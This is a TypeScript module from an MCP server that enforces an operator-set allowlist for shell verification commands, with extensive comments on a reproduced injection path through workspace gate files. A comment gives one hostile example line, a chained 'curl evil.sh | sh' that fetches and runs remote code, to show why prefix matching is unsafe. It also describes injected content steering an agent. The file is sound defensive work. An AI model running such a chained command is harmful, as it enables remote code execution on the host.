// @lifecycle canonical - Operator-declared allowlist for shell verification commands.
/**
 * Shell Command Allowlist
 *
 * WHY THIS EXISTS
 * `shell_verify` routes an author-supplied string through `sh -c`. Two authoring
 * channels reach that sink and neither is the operator:
 *
 *   1. a gate definition's `pass_criteria[].shell_command` (a YAML file placed
 *      anywhere the resources overlay reads, including a workspace directory),
 *   2. the inline `:: verify:"..."` operator carried in an invocation string.
 *
 * Both converge on `ShellVerifyExecutor.execute`. Reproduced 2026-08-25 against a
 * server started from this tree: dropping one gate.yaml carrying no `activation`
 * block into the workspace gates directory ran its command on the next chain
 * advance -- the gate was never named in the request, no verdict was submitted,
 * and no confirmation was sought.
 *
 * WHY AN ALLOWLIST AND NOT AN OFF-SWITCH
 * `shell_verify` is load-bearing: ground-truth verification by exit code is the
 * feature, and a blunt disable removes something operators legitimately want.
 * `cleanup-standards.md` §Parity Gates asks whether anyone would ever legitimately
 * CHOOSE the permissive behaviour; here they would. So the correct shape is a dial
 * the operator holds, not a capability the server drops.
 *
 * This mirrors the half of a client's permission model a server can own alone.
 * Claude Code evaluates `permissions.allow` BEFORE it ever prompts; the prompt is
 * only the fallback for what the allowlist does not cover. A server has no user to
 * prompt, but the allowlist half is authored by the operator in configuration
 * rather than arriving inside content, so a server can enforce it unaided. MCP
 * elicitation cannot substitute: an autonomous client may answer it
 * programmatically, and an agent steered by injected content is precisely the
 * threat, so it would approve itself.
 *
 * PREFIX ENTRIES AND SHELL METACHARACTERS
 * A prefix entry cannot bound what follows it once the shell can chain commands:
 * allowing `npm test*` would admit `npm test; curl evil.sh | sh`. So a command
 * containing shell control characters must match an allowlist entry EXACTLY. An
 * operator who genuinely wants a compound command declares that exact string and
 * takes the decision explicitly.
 *
 * RETIREMENT CONDITION
 * This is a permanent control, not deferred debt, so it retires only if the sink
 * it guards disappears -- i.e. if `shell_verify` stops passing an author-supplied
 * string to a shell (i.e. `resolveCommand` in `shared/utils/process.ts` no longer
 * has a `['sh', ['-c', command]]` branch reachable from a gate). Delete this module
 * and its call sites in the same commit that removes that branch.
 */

/**
 * Environment variable holding the operator's allowlist.
 *
 * Named in every refusal message, because a control the operator cannot find is a
 * control they will work around.
 */
export const SHELL_VERIFY_ALLOWLIST_ENV = 'MCP_SHELL_VERIFY_ALLOWLIST';

/**
 * The one entry that permits every command.
 *
 * A dial with no "I accept the risk" position is a dial operators route around.
 * A personal user running only their own gates genuinely wants unrestricted shell
 * verification -- that is precisely the case `cleanup-standards.md` §Parity Gates
 * says a real dial must serve -- and making them enumerate every command would
 * push them to disable the surrounding feature instead, which is a worse outcome.
 *
 * It is spelled to be legible at the configuration site and greppable across a
 * fleet: it names its own risk, it cannot be arrived at by a typo, and it is a
 * deliberate operator declaration rather than a default. That is the whole
 * difference from the behaviour this control replaced, which was the same
 * permissiveness with nobody having chosen it.
 */
export const SHELL_VERIFY_ALLOW_ALL = 'UNSAFE_ALLOW_ALL';

/**
 * Characters that let one command become several, or redirect its input/output.
 *
 * Presence of any of these means a prefix entry cannot bound the command, so an
 * exact match is required. `$(`/backtick cover substitution, `;&|` chaining,
 * `<>` redirection, and a newline is simply a statement separator to `sh`.
 */
const SHELL_CONTROL_PATTERN = /[;&|`<>\n\r]|\$\(/;

/**
 * Render a command for display and for allowlist matching.
 *
 * Argv is joined on single spaces, so one operator entry (`npm test`) authorises the
 * same command written either way and nobody has to maintain two allowlists. The join
 * is LOSSY — `["npm", "a b"]` and `["npm", "a", "b"]` render identically — and that is
 * acceptable in exactly one direction: it can make the matcher stricter than the argv
 * shape strictly requires, never more permissive, because a joined string is only ever
 * compared against entries an operator wrote out.
 */
export function formatCommandForDisplay(command: string | readonly string[]): string {
  return typeof command === 'string' ? command : command.join(' ');
}

/** Outcome of an allowlist check, carrying the reason a refusal happened. */
export interface AllowlistDecision {
  allowed: boolean;
  /** Populated only when `allowed` is false; safe to show a caller. */
  reason?: string;
}

/**
 * Read the operator's allowlist from the environment.
 *
 * Entries are newline-separated: shell commands routinely contain commas
 * (`--reporter=a,b`) and almost never contain newlines, so a comma separator
 * would silently split legitimate entries in half. A literal `\n` two-character
 * sequence is also accepted, because MCP client configuration files and `.env`
 * files commonly cannot express a real newline inside a value.
 *
 * An unset or empty variable yields an empty allowlist, which refuses everything.
 * That is the intended default: the operator opts in per command.
 */
export function loadShellVerifyAllowlist(env: NodeJS.ProcessEnv = process.env): readonly string[] {
  const raw = env[SHELL_VERIFY_ALLOWLIST_ENV];
  if (raw === undefined || raw.trim() === '') {
    return [];
  }
  return raw
    .replace(/\\n/g, '\n')
    .split('\n')
    .map((entry) => entry.trim())
    .filter((entry) => entry !== '');
}

/**
 * Decide whether `command` is permitted by `allowlist`.
 *
 * Matching rules, in order:
 * - an exact string match always allows;
 * - an entry ending in `*` allows any command starting with the text before it,
 *   but ONLY when the command carries no shell control characters.
 */
export function isCommandAllowed(
  command: string | readonly string[],
  allowlist: readonly string[]
): AllowlistDecision {
  // Argv cannot become two commands, so the metacharacter rule below does not apply to
  // it. That rule exists only because `sh -c` reparses a string; with argv a `;` is an
  // argument to the program named in slot 0 and nothing else. Skipping it is what makes
  // prefix entries genuinely usable for the channel that no longer parses.
  const isArgv = typeof command !== 'string';
  const normalized = formatCommandForDisplay(command).trim();

  if (normalized === '') {
    return { allowed: false, reason: 'empty command' };
  }

  if (allowlist.length === 0) {
    return {
      allowed: false,
      reason:
        `no shell-verification allowlist is configured, so every shell_verify command is refused. ` +
        `Set ${SHELL_VERIFY_ALLOWLIST_ENV} (newline-separated) to the commands this server may run.`,
    };
  }

  for (const entry of allowlist) {
    if (entry === SHELL_VERIFY_ALLOW_ALL || entry === normalized) {
      return { allowed: true };
    }
  }

  const compound = !isArgv && SHELL_CONTROL_PATTERN.test(normalized);
  if (!compound) {
    for (const entry of allowlist) {
      if (!entry.endsWith('*')) {
        continue;
      }
      const prefix = entry.slice(0, -1);
      if (prefix !== '' && normalized.startsWith(prefix)) {
        return { allowed: true };
      }
    }
  }

  return {
    allowed: false,
    reason: compound
      ? `command is not in ${SHELL_VERIFY_ALLOWLIST_ENV}. It contains shell control characters ` +
        `(one of ; & | \` < > $( or a newline), so a prefix entry cannot authorize it and an ` +
        `exact allowlist entry is required.`
      : `command is not in ${SHELL_VERIFY_ALLOWLIST_ENV}. Add it exactly, or add a prefix entry ` +
        `ending in '*' that covers it.`,
  };
}
